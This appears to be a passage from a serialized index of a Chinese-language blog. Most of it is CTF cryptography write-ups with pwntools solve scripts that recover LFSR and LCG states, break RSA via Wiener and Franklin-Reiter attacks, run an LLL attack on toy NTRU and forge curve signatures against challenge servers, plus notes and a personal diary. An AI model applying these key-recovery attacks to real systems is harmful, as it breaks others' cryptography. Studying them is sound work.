a2b_hex(\u0026#39;059e9c216bcc14e5d6901bcf651bee361d9fe42f225bc0539935671926e6c092\u0026#39;) data2 = a2b_hex(\u0026#39;af3fe410a6927cc227051f587a76132d668187e0de5ebf0608598a870a4bbc89\u0026#39;) decrypt1 = AES.new(key,AES.MODE_CBC,iv1) decrypt2 = AES.new(key,AES.MODE_CBC,iv2) flag1 = decrypt1.decrypt(data1) flag2 = decrypt2.decrypt(data2) print(flag1,flag2) # hgame{AdD!tiVe-Gr0up~DH_K3y+eXch@nge^4nd=A3S} 夺宝大冒险2 # lfsr基础\nfrom icecream import * from pwn import * # nc 30607 sh = remote(\u0026#39;182.92.108.71\u0026#39;, 30607) ans = [] for i in range(10): buf = sh.recvuntil(\u0026#39;guess:\u0026#39;) sh.sendline(\u0026#39;-1\u0026#39;) sh.recvuntil(\u0026#39;Wrong, the secret is \u0026#39;) buf = int(sh.recvuntil(\u0026#39;\\n\u0026#39;)[:-1]) # print(buf) ans.append(buf) print(ans) bstr = \u0026#39;\u0026#39; for i in ans: ic(i, bin(i)[2:].rjust(4, \u0026#39;0\u0026#39;)) bstr += bin(i)[2:].rjust(4, \u0026#39;0\u0026#39;) s = bstr ic(bstr,len(s)) init = int(bstr[:40],2) ic(init) class LXFIQNN(): def __init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 def next(self): nextdata = (self.init \u0026lt;\u0026lt; 1) \u0026amp; self.lengthmask i = self.init \u0026amp; self.mask \u0026amp; self.lengthmask output = 0 while i != 0: output ^= (i \u0026amp; 1) i = i \u0026gt;\u0026gt; 1 nextdata ^= output self.init = nextdata return output def random(self, nbit): output = 0 for _ in range(nbit): output \u0026lt;\u0026lt;= 1 output |= self.next() return output prng = LXFIQNN(init, 0b1011001010001010000100001000111011110101, 40) for i in range(81): secret = prng.random(4) sh.sendline(str(secret)) print(sh.recvuntil(\u0026#39;guess\u0026#39;)) sh.interactive() #hgame{lfsr_121a111y^use-in\u0026amp;crypto} 夺宝大冒险1 # 保证$a\u0026lt;c,b\u0026lt;c,a,b,c互质$,task1,2 很容易求出来\ntask3用选择明文是思想先把a,b消掉,对tmp1,tmp2取最大公因数,平均跑50次由一组适合我们这个算法的a,b,c\nfrom icecream import * from libnum import * from pwn import * # print(sh.recvline()) def t1(sh): s = sh.recvline().decode() ic(s) s =s.split(\u0026#39;,\u0026#39;) print(((s[0][1:]), (s[1][:-1]))) a,c = (int(s[0][1:]),int(s[1][:-2])) m1 = int(sh.recvline()) m2 = int(sh.recvline()) b = (m2-a*m1)%c # ic(b,int(sh.recvline())) # ic(b) sh.sendline(str(b)) def t2(sh): c = int(sh.recvline()) m = [0]+[int(sh.recvline()) for i in range(3)] a = (m[2]-m[3])*(invmod(m[1]-m[2],c)) a %= c b = m[2]-a*m[1] b %= c # ic(a, sh.recvline()) # ic(b, sh.recvline()) # ic(a,b) sh.sendline(str(a)) sh.sendline(str(b)) def t3(sh): m = [123]+[int(sh.recvline()) for i in range(7)] ic(m, len(m)) # tmp1 = -(m[7]-m[6])*(m[5]-m[4])-(m[6]-m[5])*(m[6]-m[5]) tmp1 = abs((m[4]-m[3])*(m[2]-m[1])-(m[3]-m[2])*(m[3]-m[2])) tmp2 = abs((m[7]-m[6])*(m[5]-m[4])-(m[6]-m[5])*(m[6]-m[5])) ic(tmp1, tmp2) tmp = gcd(tmp1, tmp2) # ic(tmp, int(sh.recvline())) # ic(tmp) sh.sendline(str(tmp)) # print(tmp1 % .cgen, tmp2 % gen.c) # nc 182.92.108.71 30641 def main(): tot =0 while 1: tot+=1 try: sh = remote(\u0026#39;182.92.108.71\u0026#39;, 30641) t1(sh) t2(sh) t3(sh) buf = (sh.recvall()) print(buf) if b\u0026#39;win\u0026#39; in buf: print(f\u0026#39;try {tot} times\u0026#39;) break except: pass if __name__ == \u0026#39;__main__\u0026#39;: main() \u0026#39;\u0026#39;\u0026#39; [+] Receiving all data: Done (56B) [*] Closed connection to 182.92.108.71 port 30641 b\u0026#39;win\\nhgame{Cracking^prng_Linear)Congruential\u0026amp;Generators}\\n\u0026#39; try 46 times \u0026#39;\u0026#39;\u0026#39; ","date":"26 February 2021","permalink":"/achieve/ctf/hgame2021/","section":"archive","summary":"","title":"hgame2021 密码学 writeup"},{"content":"[toc]\ngarbled # 这个有意思了\n文件里面给了一堆文件，并有一个示例文件和flag获取文件来调用整个加密电路\nfrom generate_garbled_circuit import g_tables, keys\n分析一遍数据生成流程\n生成了7组key，每组两个元素为 keyi0，keyi1 每个元素的小于2**24 将7组数据按照“门”的指引得到 3 组加密后的 table 每组4行没行两个元素从左到右分别为 gl，v 具体流程如下，以第1组table生成的情况示例：\ninput : key1,key2,key5 # g_tables 钟元素的顺序 g_tables = {5: [(g1, v1), (g2, v2), (g3, v3), (g4, v4)], g1 = enc(key5_0,(key1_0,key2_0)) g2 = enc(key5_0,(key1_0,key2_1)) g3 = enc(key5_0,(key1_1,key2_0)) g4 = enc(key5_1,(key1_1,key2_1)) v1 = enc(0,(key1_0,key2_0)) v2 = enc(0,(key1_0,key2_1)) v3 = enc(0,(key1_1,key2_0)) v4 = enc(0,(key1_1,key2_1)) 分析调用电路生成input的代码发现input的4个元素为 $key_{11},key_{21},key_{31},key_{41}$\nevaluate_circuit 对 g_tables内容进行解密，恢复出 $key_{51},key_{61},key_{71}$\n以第一组 g_tables 即 key1，key2，key5为例\nkey5_1 = dec(g1, (key1_1, key2_1)) 0 = dec(v1, (key1_1, key2_1)) def dec(data, key1, key2): decrypted = decrypt_data(data, key2) decrypted = decrypt_data(decrypted, key1) return decrypted 通过key1_1~4_1可以恢复出所有keyi_1\n你问我为什么不恢复出所有key？\n这就涉及到GarbledCircuit设计初衷了 咕咕咕\n对解密的场景可以扩展出这样的式子\n0 = dec(v1, (key1_0, key2_0)) 0 = dec(v2, (key1_0, key2_1)) 0 = dec(v3, (key1_1, key2_0)) 0 = dec(v4, (key1_1, key2_1)) 我们可以想办法找出所有的key1,key2开缩小范围，但2**48的复杂度是我们不愿意看到的，这里用中间相遇攻击的思想将复杂度降到$O(2\\times2^{24})$,这是一个我们可以接受的范围\n现在，我们得到了所有满足下式成立的key，需要我们想办法准确的定位地定位到 key1_1, key2_1\n0 = dec(v1, (key1_0, key2_0)) 0 = dec(v2, (key1_0, key2_1)) 0 = dec(v3, (key1_1, key2_0)) 0 = dec(v4, (key1_1, key2_1)) 由数据生成的代码我们可知：\nkey5_0 = dec(g1, (key1_0, key2_0)) key5_0 = dec(g2, (key1_0, key2_1)) key5_0 = dec(g3, (key1_1, key2_0)) key5_1 = dec(g4, (key1_1, key2_1)) $algorithm1$\n$$ assume (k11,k21)is\\;global\\;keys\\\\\\\\ there\\;must\\;exist\\;\\\\\\\\ (k10,k21)\\\\\\\\ (k11,k20)\\\\\\\\ (k10,k20)\\\\\\\\ dec(g1, (key1\\_0, key2\\_0))= dec(g2, (key1\\_0, key2\\_1))= dec(g3, (key1\\_1, key2\\_0)) $$ 综上，可以得到 key1_1, key2_1 的准确值\nplagiarism # algorithm：\nSo we have two ciphertexts:\nC1 = P1e mod(N)\nC2 = P2e mod(N)\nwhere second text is simply first with known difference:\nP2 = P1+δ\nso we have after substitution:\nf = P1e mod(N) - C1\ng = (P1+δ)e mod(N) - C2\nCalculating GCD(f,g) will give us common dividor a * P1 + b so P1 = -b⁄a.\nsage 多项式环算 gcd\nR = PolynomialRing(Zmod(n), \u0026#39;X\u0026#39;) X = R.gen() f1 = (X)**e - c1 f2 = (X + delta)**e - c2 r = gcd(f1, f2) def hgcd(a0,a1): if a1.degree() \u0026lt;= (a0.degree()//2): return np.array([[1,0],[0,1]]) m = a0.degree()//2 X = a0.variables()[0] b0 = a0 // X**m b1 = a1 // X**m R = hgcd(b0,b1) [d,e] = (R.dot(np.array([a0,a1]).transpose())).transpose() ff = d % e m = m // 2 g0 = e // X**m g1 = ff // X**m S = hgcd(g0,g1) q = d // e return S.dot(np.array([[0,1],[1,-q]])).dot(R) def gcd(a0,a1): while True: print(a0.degree(), end=\u0026#34;, \u0026#34;, flush=True) if a0 % a1 == 0: return a1 if a0.degree() == a1.degree(): a1 = a0%a1 #print(a0.degree()) R = hgcd(a0,a1) [b0,b1] = R.dot(np.array([a0,a1]).transpose()).transpose() if b0%b1==0: return b1 c = b0 % b1 a0 = b1 a1 = c ","date":"23 February 2021","permalink":"/achieve/ctf/dicectf2021/","section":"archive","summary":"","title":"dicectf2021"},{"content":"[toc]\n一年过去了呢,稍微记一下这一年到头都干了些什么事吧\n回家后心情莫名变好了\n不管怎么说又成功无伤混了一学期呢(￣y▽,￣)╭\n不分先后随缘排序\n2021 # 东高联跨年\n抓住最后一点落日\n古镇\n放假前一天\n学校的家底\n摸黑干饭 喝了味道不咋地的洋酒\n下半年 # 宣讲\n川大\n下雪了\n乌苏还可以\n回到老巢\n南京 # 秦淮河\n南邮边上的那啥湖\n北京 # 明长城\n独具特色的地铁站\n还行，人不是特别多\n下火车\n传统艺能深夜便利店\n天津 # 县上的绿皮火车站\n便利店传统艺能\n上半年 # 折腾双系统\n成功蓝屏\n宽窄巷子\n","date":"23 February 2021","permalink":"/achieve/loving-2020/","section":"archive","summary":"[toc]","title":"loving-2020"},{"content":"","date":"23 February 2021","permalink":"/categories/notes/","section":"Categories","summary":"","title":"notes"},{"content":"[toc]\nSR.var(\u0026#39;x\u0026#39;,10) 创建 x数组[0~9] # the same command works also with SR.var(\u0026#39;a, b, c, x\u0026#39; a, b, c, x = var(\u0026#39;a, b, c, x\u0026#39;) a, x = var(\u0026#39;a, x\u0026#39;) expr = cos(x+a) * (x+1) expr (x+1)cos(a+x) expr.subs(a == -x) x+1 expr.subs(x == pi, a == pi) 5cos(8) substitute/subs 添加条件 n = var(\u0026#39;n\u0026#39;) assume(n, \u0026#39;integer\u0026#39;) 不妨设 n 为整数 sin(n * pi) 0 assume(n \u0026gt; 0) assumptions()将所有现存的假设作为条件输出 [n is integer, n \u0026gt; 0] forget() 遗忘所有假设 Sage还是简化符号表达式的强大工具。 # f=(x^2-1) / (x+1) # (x^2 - 1)/(x + 1) 未知数f 拥有这些符号变量 生成常规ecc曲线 # In Sage, an elliptic curve is always specified by (the coefficients of) a long Weierstrass equation\n$y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6$\nparameter2：EllipticCurve(p，[a1,a2,a3,a4,a6])\n25519\nE = EllipticCurve(GF(2^255 - 19), [0, 486662, 0, 1, 0]) p = E.order()\t# 求阶 ZmodP = Zmod(p) #构建环 G = E.lift_x(9) # x为9的点 *ctf ecc\n_F=GF(2**100) _G = (_F.fetch_int(698546134536218110797266045394),_F.fetch_int(1234575357354908313123830206394)) _P = (_F.fetch_int(403494114976379491717836688842), _F.fetch_int(915160228101530700618267188624)) E = EllipticCurve(GF(2**100), [1, 2, 0, 0, 3]) # 常规点转为ecc点 G = E(G) P = E(P) 多项式环 # R = PolynomialRing(Zmod(n), \u0026#39;X\u0026#39;) X = R.gen() f1 = (X)**e - c1 f2 = (X + delta)**e - c2 return sympy.nextPrime((B!)%A) 解方程 # var(\u0026#39;x\u0026#39;) sol = solve([x^2 - p_q*x + N == 0], [x]) print(sol) # sagemath会返回算式 small_roots # PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(N)) f = p0 + x f = f.monic() roots = f.small_roots(X=2^430, beta=0.4) if roots: p = p0 + roots[0] print(p) ","date":"23 February 2021","permalink":"/achieve/2019to2021/sagemath%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/","section":"archive","summary":"\u003cp\u003e[toc]\u003c/p\u003e","title":"sagemath入门笔记.md"},{"content":"[toc]\n这几天写gin的一些东西 # 登录 # get得到html界面\npost：\ngin接受html表单传回的post数据\nhtml的js接收gin传回的json实现前后端简单的交互\n登录流程\n检测cookie是否已经登录 检测用户名是非为空 检测数据库中是非有改用户名 检测密码 注册 # 注册流程\n检测cookie 检测是非为空 检测数据库是非有对应邮箱 注册成功 后期加上邮箱格式验证（\ncookie # setUserCookie # 将该user的结构体json化传回\nlogout # 清除usercookie\n","date":"23 February 2021","permalink":"/achieve/2019to2021/gin%E7%AC%94%E8%AE%B0/","section":"archive","summary":"[toc]","title":"gin笔记.md"},{"content":"[toc]\nsm2 # SM2是\r国家密码管理局于2010年12月17日发布的椭圆曲线公钥密码算法。\necc回顾 # 选取曲线 Ep(a,b) Alice取 基点G和私钥k,计算公钥 pubk.传pubk和G给bob bob计算 C1=M+rK；C2=rG传给alice A接到信息后，计算C1-kC2，结果就是点M 描述一条Fp上的椭圆曲线，常用到六个参量：T=(p,a,b,G,n,h)\np a b用来确定曲线\nG为基点，n为点G的阶，h 是椭圆曲线上所有点的个数m与n整除\n爱德华曲线简介 # 形如\n$x^2+y^2=1-d\\cdot x^2 \\cdot y^2$\n加法 # p1+p2\n2*p\n逆元\n（x，y）-\u0026gt;(-x,y)\n零元\n（0，1）\n爱德华曲线运算的几何意义 # 先考虑常规圆\n先建立一个但为远$x^2+y^2=1$\n考虑一个爱德华单位曲线\n常规爱德华曲线基本性质就这些了\n蒙哥马利曲线 Ed25519 签名 # 蒙哥马利曲线（Montgomery curve）是另一种形式的椭圆曲线\n常规ecc\n$y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6$\n蒙哥马利曲线\n$By^2=x^3+Ax^2+x$\n","date":"23 February 2021","permalink":"/achieve/2019to2021/%E7%88%B1%E5%BE%B7%E5%8D%8E%E6%9B%B2%E7%BA%BF-%E8%92%99%E5%93%A5%E9%A9%AC%E5%88%A9/","section":"archive","summary":"[toc]","title":"爱德华曲线-蒙哥马利.md"},{"content":"[toc]\ntiming attack # 时序攻击属于侧信道攻击/旁路攻击\n比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。\n某个函数负责比较用户输入的密码和存放在系统内密码是否相同，如果该函数是从第一位开始比较，发现不同就立即返回，那么通过计算返回的速度就知道了大概是哪一位开始不同的\ncenter-lifts ?\nntru密码算法 # 选取 n p q d\nn = 109 q = 2048 p = 3 q \u0026gt; (6d+1)p\n为公开参数\nq 最好为2的幂,不能为3的倍数\n取多项式 f g\nprikey\nf fq*f = 1 mod q g pubkey $$ h \\equiv pg*f_{q};mod;q $$\nenc # 取随机数 r,msg多项式化为m\nc = rh+m mod q\ndec # a = f*c= f (rh +m )=fprh + fm = f *r *pg fq mod q\na = rpg + m mod q\nm = a mod p\n攻击实例 # This attack breaks NTRU with n = 7, d = 5, q = 256.\ndef convolution(f, g): return (f * g) % (x ^ n-1) Zx.\u0026lt;x\u0026gt; = ZZ[] n = 7 d = 5 q = 256 h=-82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5 h3 = ((171)*h) % q # lift(1/Integers(q)(p)) * h M = matrix(2*n) for i in range(n): M[i,i] = q for i in range(n,2*n): M[i,i] = 1 for i in range(n): for j in range(n): M[i+n,j] = convolution(h3,x^i)[j] print(M) print(M.LLL()[0]) ","date":"22 February 2021","permalink":"/achieve/2019to2021/ntru%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/","section":"archive","summary":"[toc]","title":"ntru密码算法.md"},{"content":"[toc]\nwinner poorf # $$ \\begin{aligned} \u0026N = q\\times p\\\\ \u0026\\phi(n)=(p-1)\\times (q-1)\\\\ \u0026phi(n)\\approx n\\\\ \u0026ed =1 +k\\phi(n)\\\\ \u0026同除d\\phi(n)得\\\\ \u0026\\frac{e}{\\phi(n)}=\\frac{1}{d\\phi(n)}+\\frac{k}{d}\\\\ \u0026因为 \\phi(n)\\approx\\;n\\\\ \u0026\\frac{e}{N}=\\frac{1}{d\\phi(n)}+\\frac{k}{d}得到\\frac{k}{d}的近似值\\\\ \u0026利用求根公式或者以下步骤验证\\\\ \u0026ed=k(p-1)(q-1)+1\\\\ \u0026[\\frac{ed}{k}]=(p-1)(q-1)\\\\ \u0026\\frac{pq-(p-1)(q-1)1+1}{2}=\\frac{p+q}{2}\\\\ \u0026(\\frac{p+q}{2})^2-pq=(\\frac{p-q}{2})^2 \\end{aligned} $$ from sage.all import continued_fraction, Integer def wiener(e, n): m = 12345 c = pow(m, e, n) list1 = continued_fraction(Integer(e)/Integer(n)) conv = list1.convergents() for i in conv: d = int(i.denominator()) # 分母 m1 = pow(c, d, n) if m1 == m: return d n, e = pubkey print wiener(e, n) $\\frac{e}{N}=\\frac{1}{d\\phi(n)}+\\frac{k}{d}得到\\frac{k}{d}$\n的近似值后sagemath可以自行输出分子分母\nweird x-unca # e的取值范围为：\n$$ \\begin{equation}\\begin{split} \u0026e = \\frac{y}{x} \\cdot ((p+1)(q+1) \\pm \\frac{(p-q)\\cdot N^{0.21}}{3(p+q)})\\\\ \u0026\\frac{e}{n}=\\frac{y}{x}(1+\\frac{p+q+1}{n}\\pm\\frac{p-q}{3(p+q)N^{0.79}})\\\\ \u0026约等于\\frac{e}{n}=\\frac{y}{x}+0 \\end{split}\\end{equation} $$ x = getrandbits(512) y = getrandbits(512) for yx in continued_fraction(e/N).convergents(): y = yx.numerator() x = yx.denominator() if 505 \u0026lt; int(y).bit_length() \u0026lt; 512: print(y, x) ASIS Finals CTF 2017- Gracias Writeup # paper\nAndrej Dujella说分母不仅可以得到d，d还可以写成$d=tqi+sq_{i-1}$\nqi为第i次的分母\nfrom sage.all import continued_fraction, Integer from Crypto.Util.number import * def wiener(e, n): m = 12345 c = pow(m, e, n) q0 = 1 list1 = continued_fraction(Integer(e)/Integer(n)) conv = list1.convergents() for i in conv: k = i.numerator() # 分子 qi = i.denominator() # 分母 for r in range(20): for s in range(20): d = r*qi + s*qi_1 m1 = pow(c, d, n) if m1 == m: return d qi_1 = qi n, e = pubkey c1, c2 = c d = wiener(e, n) 西湖论剑-2020-Wake me up until May ends-task # limit1 = (3 * n) // (2 * (int(iroot(n, 4)[0]) + 3 * (p + q))) x * y \u0026lt; limit1 limit2 = (abs(p-q) * int(iroot(n, 4)[0]) * y) // (6 * (max(p, q))) z = e * x - y * _phi abs(z) \u0026lt; limit2 limit1 $xy\u0026lt;\\frac{3n}{2n^{\\frac{1}{4}}+3(p+q)}$\nlimit2 (assume q\u0026gt;p) $z=ex-y\\phi(n)\u0026gt;\\frac{(p-q)n^{\\frac{1}{4}}y}{6q}$ 由于e是一个一个减下去的，可以近似看为等号\n$e = (\\frac{(p-q)n^{\\frac{1}{4}}}{6q}+\\phi(n))\\frac{y}{x}$ $\\frac{e}{n} = (\\frac{(p-q)n^{\\frac{1}{4}}}{6qn}+\\frac{\\phi(n)}{n})\\frac{y}{x}\\approx\\frac{y}{x}$\n","date":"22 February 2021","permalink":"/achieve/2019to2021/%E8%BF%9E%E5%88%86%E6%95%B0%E4%BB%A3%E7%A0%81/","section":"archive","summary":"[toc]","title":"连分数代码.md"},{"content":"\r安全多方计算 # 很重要的老东西了，但应用范围极其广泛，作为科普学习一下蛮好的\n安全的分布式计算 MPC (Secure multi-party computation)指的是用户在无需进行数据归集的情况下，完成数据协同计算，同时保护数据所有方的原始数据隐私。具体来说，有n个计算参与方，分别持有私有数据$x_1,x_2x_3,..x_i,$共同计算既定函数$f(x_1\u0026hellip;x_n)=y$\n混淆电路（Garbled Circuit) # 前提知识 # Garbled Circuit是MPC的一种实现方式，由姚期智先生提出（那是真滴牛批），通俗的说，就是一堆人各自拥有其隐私数据，他们想把这些数据合起来算点什么，但又不想把数据交给别人，混淆电路解决的就是此类问题。\nOblivious Transfer 不经意传输 # Oblivious Transfer，中文称为不经意传输，通常简写为OT\n它指的是发送者从一个值集合中向接收者发送单个值的问题，这里发送者无法知道发送的是哪一个值，而且接收者也不能获知除了接收值之外的其它任何值。\n发送者有由N个值组成的集合，接收者有 $i$ 协议执行完成,接收者只知道 $i$ 协议,且发送者不知道 $i$ 协议,\n协议执行的过程中，满足以下性质：\n发送者不知道接受者要那个 接受者只能成功获取需要的那个值 这张图就很灵性\n姚氏百万富翁问题 这个问题的解提供了一种 将两个信息隐藏在不同 “维度” 但只有我才能通过我们共同生成的信息中知晓问题的答案的模型\nMPC的中心思想，那就是彼此把数据x，y藏在自己的维度上，然后找到一个交点，就是我们需要共同计算的函数f（x，y）。Yao的姚氏百万富翁问题仅限于比较大小，即一个布尔值的计算。\n当然后来一个在此基础上一个更加伟大的密码学算法被发明出来了，那就混淆电路。它把这个交点扩展到任何电脑可计算的函数，从此不管是比较大小，还是复杂到神经网络，都可以用类似的方法计算了。\n应用 # 应用到计算机上的例子可以理解为我有一个 and 门 两个输入一个输出\ntable\nx y z 1 1 1 1 0 0 0 0 0 0 1 0 加密这些真值表将电路转换成加密电路Garbled Circuit\n这里table每一个位置的每一种值都对应了一个key\n假设实例table\nx y z 1 1 0 1 0 1 0 0 0 0 1 0 实际计算中表会生成四个数据\nAlice用这些密钥加密真值表，并将该表打乱后发送给Bob，比如Alice的输入是0，那就发$k_0$，输入是1就发 $k_1$\n同时把和Bob有关的key都发给Bob\nBob根据收到的 key 对上述加密表 根据输入选择一行解密并提取出相应的kz\nBob将kz发给Alice，Alice通过对比得知计算结果是0还是1\n","date":"20 February 2021","permalink":"/achieve/2019to2021/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%8E%A9%E7%9A%84%E4%B8%9C%E8%A5%BF/","section":"archive","summary":"安全多方计算 # 很重要的老东西了，但应用范围极其广泛，作为科普学习一下蛮好的","title":"又一个好玩的东西"},{"content":" 蛮有意思的小case\n用了蒙哥马利曲线25519的签名算法\n整个题的核心再这里\nreturn e == hashs(m, s*G + e*P, s*hashp(P) + e*I) 除要求输入的参数 e , s 和点 I 外其他参数都是给出了的，所以需要选取事等式实现的e s I，但hashs是单向的 所以构造常规的等式并不现实，将hashs参数设为 $hashs（ m ，A ，B）$ 进行思考，\n由于无法从e推到A和B 不妨假设A B已知,得到\n$e=hashs(m,A,B)$\n有 $$ \\begin{cases} A = s\\cdot G+e\\cdot P\\ B = s\\cdot H_p(p)+e\\cdot I \\end{cases} $$ 不妨令$A= a\\cdot G;,B= b\\cdot G$ 并且输入的 $I$一定在ecc上\n故有 $$ \\begin{cases} a\\cdot G = s\\cdot G+e\\cdot P\\ b\\cdot G = s\\cdot H_p(p)+e\\cdot I \\end{cases} \\to \\begin{cases} s = a - ex\\ iG=(b\\cdot G-s\\cdot H_p(p))\\cdot e^{-1} \\end{cases} $$ $$e=hashs(m,aG,bG)$$\n那么接下来的任务就是去找a和b了\na和b的范围还有约束条件除了满足e有逆元外好像完全没有任何头绪,但是G的选取帮了我们大忙\n由于G是生成元,所以不用担心会不存在使 $$ \\begin{cases} A = s\\cdot G+e\\cdot P\\ B = s\\cdot H_p(p)+e\\cdot I \\end{cases} $$ 成立的$e ,s, I$\n经验证,只需要满足e能够取到逆元就ok了\n# sage # -*- encoding: utf-8 -*- \u0026#39;\u0026#39;\u0026#39; @File : exp_me.sage @Time : 2021/02/10 15:05:20 @Author : ljahum @Contact : roomoflja@gmail.com @Desc : None \u0026#39;\u0026#39;\u0026#39; # code here from os import environ environ[\u0026#39;PWNLIB_NOTERM\u0026#39;] = \u0026#39;True\u0026#39; from pwn import remote from hashlib import sha256 ha = lambda x: x if isinstance(x, int) or isinstance(x, Integer) else product(x.xy()) hashs = lambda *x: int.from_bytes( sha256(b\u0026#39;.\u0026#39;.join([b\u0026#39;%X\u0026#39; % ha(x) for x in x])).digest(), \u0026#39;little\u0026#39;) % p def hashp(x): x = hashs((x)) while True: try: return E.lift_x(x) except: x = hashs((x)) E = EllipticCurve(GF(2 ^ 255 - 19), [0, 486662, 0, 1, 0]) p = E.order() ZmodP = Zmod(p) G = E.lift_x(9) cn = remote(\u0026#39;0.0.0.0\u0026#39;, 10000) data = cn.recvline().decode().strip() print(data) x = int(data.split()[0]) P = x*G m = int(data.split()[-1]) tot =0 while tot \u0026lt;8: a = randint(1, p) b = randint(1, p) aG = a*G bG = b*G e = hashs(m, aG, bG) if not e \u0026amp; 1: print(\u0026#39;try again\u0026#39;) continue s = a - e*x e_inv = inverse_mod(e,p) I = e_inv*(bG - s*hashp(P)) Ix = I.xy()[0] Iy = I.xy()[1] cn.sendlineafter(\u0026#39;I (x): \u0026#39;, str(Ix)) cn.sendlineafter(\u0026#39;I (y): \u0026#39;, str(Iy)) cn.sendlineafter(\u0026#39;e: \u0026#39;, str(e)) cn.sendlineafter(\u0026#39;s: \u0026#39;, str(s)) cn.recvline() tot += 1 print(cn.recvall()) ","date":"16 February 2021","permalink":"/achieve/ctf/catthefish/","section":"archive","summary":"蛮有意思的小case","title":"很古典的思维catthefish2021"},{"content":"\r*ctf2021 # myenc # ct=iv for i in range(1,8): if keystream[cnt]==\u0026#39;1\u0026#39;: ct+=pow(m^q,i**i**i,n) ct%=n cnt=(cnt+1)%len(keystream) print(\u0026#34;done:\u0026#34;,ct) 主要难点在这里\npow(m^q,i**i**i,n)无法正常求解，直接看做7个不变的未知数，外加iv，就是8个不变的未知数，keystream看做向量k，可以把原题看做以下矩阵 $$\n\\begin{cases} k_1x_1 +\u0026amp; \\cdots \u0026amp; k_7x_7;;+iv=C_1\\\\ k_8x_1 + \u0026amp; \\cdots \u0026amp; k_{14}x_7 ;+iv=C_2\\\\ \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ k_{113}x_1 +\u0026amp; \\cdots \u0026amp; k_{119}x_7 \\;+iv=C_{17}\\\\ k_{120}x_1 +\u0026amp; \\cdots \u0026amp; k_6x_7\\;\\;\\;+iv;=C_{18}\\\\ k_{7}x_1 +\u0026amp; \\cdots \u0026amp; k_{13}x_7\\;\\;+iv\\;=C_{19}\\\\ \\vdots \\end{cases}\n$$\n对k1到k7*8爆破是不明智的，选取其他等式组合一下，目标是尽可能用少的k覆盖多的x： $$ \\begin{pmatrix} k_8 \u0026amp; \\cdots \u0026amp; k_{14}\u0026amp;1\\\\ k_7 \u0026amp; \\cdots \u0026amp; k_{13} \u0026amp;1\\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ k_{1}\u0026amp; \\cdots \u0026amp; k_{7} \u0026amp;1 \\end{pmatrix}\n\\begin{pmatrix} x_1\\\\ x_{2}\\\\ \\end{pmatrix}\n\\begin{pmatrix} C_2\\\\ C_{19}\\\\ \\end{pmatrix}\n$$\n这个时候对 K 矩阵爆破的复杂度只有$O(2^{14})$写脚本获取121+组数据一把梭哈就ok了\n接收数据并全部写入文件\nfrom pwn import *\rfrom hashlib import md5, sha256\rfrom itertools import product\rfrom string import digits, ascii_letters\rfrom icecream import *\rdef getxxxx():\rr.recvuntil(b\u0026#39;xxxx+\u0026#39;)\rbuf = r.recvuntil(b\u0026#39;) \u0026#39;)[:-2]\rs2 = buf\rr.recvuntil(b\u0026#39;= \u0026#39;)\rbuf = r.recvuntil(b\u0026#39;\\\\n\u0026#39;)[:-1]\rhashenc = (buf.decode())\ric(s2, hashenc)\rtab = bytes(digits + ascii_letters, encoding=\u0026#39;utf-8\u0026#39;)\rfor s1 in product(tab, repeat=4):\rdata = bytes(s1) + s2\rhash_data = sha256(data).hexdigest()\rif hash_data == hashenc:\ric(hash_data, hashenc)\rbuf = r.recv(1024)\rprint(buf)\rprint(bytes(s1))\rr.sendline(bytes(s1))\r# buf = r.recv(1024)\r# print(buf)\rreturn bytes(s1)\r# input()\rr = remote( \u0026#39;52.163.228.53\u0026#39;, 8081)\rgetxxxx()\r# r = remote(\u0026#39;0.0.0.0\u0026#39;, 10000)\rf = open(\u0026#39;./远程记录的密文.py\u0026#39;, \u0026#39;a\u0026#39;)\rf.seek(0)\rf.truncate()\rbuf = r.recvuntil(b\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)\rprint(buf)\rn = int(buf[len(\u0026#39;n: \u0026#39;):-len(\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)])\rprint(n)\rf.write(\u0026#39;n=\u0026#39;+str(n)+\u0026#39;\\\\n\u0026#39;)\rr.sendlines(\u0026#39;0\u0026#39;)\rans = []\rfor i in range(125):\rbuf = r.recvuntil(b\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)\r# print(buf)\rt = int(buf[len(\u0026#39;done: \u0026#39;):-len(\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)])\rprint(t)\rans.append(t)\rr.sendlines(\u0026#39;0\u0026#39;)\rprint(ans)\rf.write(\u0026#39;enc=[\u0026#39;)\rfor i in ans:\rf.write(str(i)+\u0026#39;,\\\\n\u0026#39;)\rf.write(\u0026#39;]\u0026#39;)\r# input(\u0026#34;按任意键继续\u0026#34;) sage爆破矩阵脚本\nfrom 远程记录的密文 import n, enc\rfrom Crypto.Util.number import *\rdef getall(l):\rx = l[:7]\riv = l[7]\rtab = []\rfor i in range(128):\rbin_arr = (bin(i)[2:].rjust(7, \u0026#39;0\u0026#39;))\r# print(bin_arr)\rtemp = 0\rfor j in range(len(bin_arr)):\rtemp += int(bin_arr[j])*x[j]\rtemp += iv\rtemp %= n\r# print(temp)\r# input()\rtab.append(temp)\rflag = \u0026#39;\u0026#39;\rfor i in enc:\r# print(tab.index(i))\rflag += bin(tab.index(i))[2:].rjust(7, \u0026#39;0\u0026#39;)\rflag = flag[:120]\rflag = (int(flag, 2))\rprint(long_to_bytes(flag))\rdef get_x(c, m, _):\r# 矩阵行列化\r# x = [[i]for i in x]\rc = [[i] for i in c]\rm = m[::-1]\rc = Matrix(Zmod(n), c)\rm = Matrix(Zmod(n), m)\rx1 = (m.inverse()*c)\r# print(x1)\rl = []\rfor i in x1:\rl.append(i[0])\rgetall(l)\rc = []\rfor i in range(8):\rj = i*17+2\rc.append(enc[j-1])\rfor _ in range(0x4000):\rkey = bin(_)[2:].rjust(14, 